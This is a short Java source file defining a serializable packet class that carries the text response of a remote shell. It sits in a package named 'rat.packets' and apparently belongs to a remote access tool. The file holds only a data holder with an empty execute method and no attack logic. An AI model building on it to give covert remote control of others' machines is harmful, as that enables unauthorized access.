package rat.packets;

import java.io.Serializable;

public class RemoteShellResponsePacket implements IPacket, Serializable {

    private static final long serialVersionUID = -8360740884056831778L;

    private String response;

    public RemoteShellResponsePacket(String response) {
        this.response = response;
    }

    public String getResponse() {
        return response;
    }

    @Override
    public void execute() {

    }

    @Override
    public PacketType getPacketType() {
        return PacketType.REMOTE_SHELL_DATA;
    }
}
